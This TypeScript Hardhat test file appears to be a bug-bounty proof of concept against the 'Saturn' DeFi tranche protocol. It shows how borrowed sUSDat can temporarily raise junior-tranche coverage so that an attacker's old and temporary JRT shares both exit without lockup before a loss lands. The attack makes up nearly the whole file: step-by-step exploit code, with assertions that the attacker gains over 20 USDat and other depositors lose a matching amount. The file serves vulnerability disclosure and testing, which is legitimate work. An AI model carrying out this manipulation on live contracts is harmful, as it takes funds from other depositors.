import { HardhatProvider } from 'dequanto/hardhat/HardhatProvider';
import { UTest } from 'atma-utest';
import { $require } from 'dequanto/utils/$require';
import { $hh } from '../utils/$hh';
import { $erc20 } from '../utils/$erc20';
import { $erc4626 } from '../utils/$erc4626';
import { MockStakedUSDat } from '@0xc/hardhat/MockStakedUSDat/MockStakedUSDat';

/**
 * Saturn scaling PoC for transient JRT coverage manipulation.
 *
 * Starting state is ~230 JRT / ~1000 SRT (protected 15-30% tier). The attacker
 * owns 150 of the pre-existing JRT. Temporary lender-owned sUSDat raises coverage
 * enough that both the 150 old JRT and the temporary JRT independently receive
 * the >30% zero-lock tier. After the temporary capital is repaid, available JRT
 * coverage lands close to Saturn's 7.5% hard withdrawal floor.
 *
 * The same global 4% sUSDat backing loss then occurs in attack and control worlds.
 * This shows the effect scales with the old JRT position rather than being a
 * rounding-sized artifact of the smaller PoC.
 */

const hh = new HardhatProvider();
const attacker = await hh.deployer(1);
const liquidityProvider = await hh.deployer(2);
const lender = await hh.deployer(3);
const test = await $hh.create('saturn');

const {
    jrtVault,
    srtVault,
    cdo,
} = await test.deploy({ initialDeposit: false });
const { base, sUSDat } = await test.factory.ensureUnderlying();
const { sharesCooldown } = await test.factory.ensureCooldowns(cdo);
const { deployer } = test;
const mockSUSDat = new MockStakedUSDat(sUSDat.address, sUSDat.client);

// Deployable, ordinary state: both tranches are far above Immunefi's >=10-asset
// seeding requirement. Attacker later acquires 150 of the existing JRT shares.
await $erc20.mint(base, deployer, liquidityProvider, 1_230);
await $erc4626.depositMeta(jrtVault, base.address, liquidityProvider, 230);
await $erc4626.depositMeta(srtVault, base.address, liquidityProvider, 1_000);
await $erc20.transfer(jrtVault, liquidityProvider, attacker.address, 150);

// Existing lender capital. ~225 USDat-equivalent is sufficient to keep coverage
// above 30% even after the old 150-JRT redemption, with margin for fees/rounding.
const LOAN_VALUE = 225n * 10n ** 6n;
const loanShares = await sUSDat.convertToShares(LOAN_VALUE);
await $erc4626.mint(sUSDat as any, lender, loanShares);
$require.eq(await sUSDat.balanceOf(lender.address), loanShares);

const coverageT0 = Number(await cdo.coverage());
$require.gt(coverageT0, 150_000);
$require.lt(coverageT0, 300_000);

await test.snapshot('transient-coverage-saturn-scale');

UTest.create({
    async $after () {
        await test.wipe();
    },
    async $teardown () {
        await test.reset('transient-coverage-saturn-scale');
    },

    async 'near-floor attack exits 150 old JRT, repays temporary capital, and shifts >20 USDat under the same loss' () {
        // ---------------- Control world ----------------
        let oldShares = await jrtVault.balanceOf(attacker.address);
        let lpShares = await jrtVault.balanceOf(liquidityProvider.address);

        const controlImmediate = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            oldShares,
        );
        $require.eq(controlImmediate, 0n);
        $require.gt(await jrtVault.balanceOf(sharesCooldown.address), 0n);

        await applyGlobalFourPercentSUSDatLoss();
        await test.mine('7days');
        await sharesCooldown.$receipt().finalize(
            attacker,
            jrtVault.address,
            sUSDat.address,
            attacker.address,
        );

        const controlUnits = await sUSDat.balanceOf(attacker.address);
        const controlValue = await sUSDat.convertToAssets(controlUnits);
        const controlLpValue = await jrtVault.convertToAssets(lpShares);

        // ---------------- Attack world ----------------
        await test.reset('transient-coverage-saturn-scale');

        oldShares = await jrtVault.balanceOf(attacker.address);
        lpShares = await jrtVault.balanceOf(liquidityProvider.address);

        await $erc20.transfer(sUSDat, lender, attacker.address, loanShares);
        await $erc4626.depositMeta(jrtVault, sUSDat.address, attacker, loanShares);
        $require.gt(Number(await cdo.coverage()), 300_000);

        const oldAssetsOut = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            oldShares,
        );
        $require.gt(oldAssetsOut, 0n);

        // Critical sequential condition: after removing the large pre-existing
        // position, temporary JRT still independently observes >30% coverage.
        $require.gt(Number(await cdo.coverage()), 300_000);

        const temporaryShares = await jrtVault.balanceOf(attacker.address);
        const temporaryAssetsOut = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            temporaryShares,
        );
        $require.gt(temporaryAssetsOut, 0n);
        $require.eq(await jrtVault.balanceOf(sharesCooldown.address), 0n);

        // The two zero-lock exits can drive coverage close to, but not through,
        // the independent 7.5% hard JRT/SRT floor.
        const coverageAfterUnwind = Number(await cdo.coverage());
        $require.gt(coverageAfterUnwind, 75_000);
        $require.lt(coverageAfterUnwind, 100_000);

        // Return the exact borrowed sUSDat units before any loss occurs.
        $require.gte(await sUSDat.balanceOf(attacker.address), loanShares);
        await $erc20.transfer(sUSDat, attacker, lender.address, loanShares);
        $require.eq(await sUSDat.balanceOf(lender.address), loanShares);

        await applyGlobalFourPercentSUSDatLoss();
        await test.mine('7days');

        const attackUnits = await sUSDat.balanceOf(attacker.address);
        const attackValue = await sUSDat.convertToAssets(attackUnits);
        const attackLpValue = await jrtVault.convertToAssets(lpShares);

        const attackerAdvantage = attackValue - controlValue;
        const remainingJrtVictimLoss = controlLpValue - attackLpValue;

        console.log('scale control attacker value', controlValue.toString());
        console.log('scale attack attacker value', attackValue.toString());
        console.log('scale attacker advantage', attackerAdvantage.toString());
        console.log('scale control remaining-JRT value', controlLpValue.toString());
        console.log('scale attack remaining-JRT value', attackLpValue.toString());
        console.log('scale remaining-JRT victim loss', remainingJrtVictimLoss.toString());
        console.log('scale final coverage ppm', coverageAfterUnwind.toString());

        // USDat has 6 decimals: require tens of whole assets, not rounding dust.
        $require.gt(attackerAdvantage, 20n * 10n ** 6n);
        $require.gt(remainingJrtVictimLoss, 20n * 10n ** 6n);

        const diff = attackerAdvantage > remainingJrtVictimLoss
            ? attackerAdvantage - remainingJrtVictimLoss
            : remainingJrtVictimLoss - attackerAdvantage;
        $require.lt(diff, 2n * 10n ** 6n);
    },
});

async function applyGlobalFourPercentSUSDatLoss () {
    const backingBefore = await mockSUSDat.usdatBalance();
    $require.gt(backingBefore, 0n);
    await mockSUSDat.$receipt().setUsdatBalance(
        deployer,
        backingBefore * 96n / 100n,
    );
}
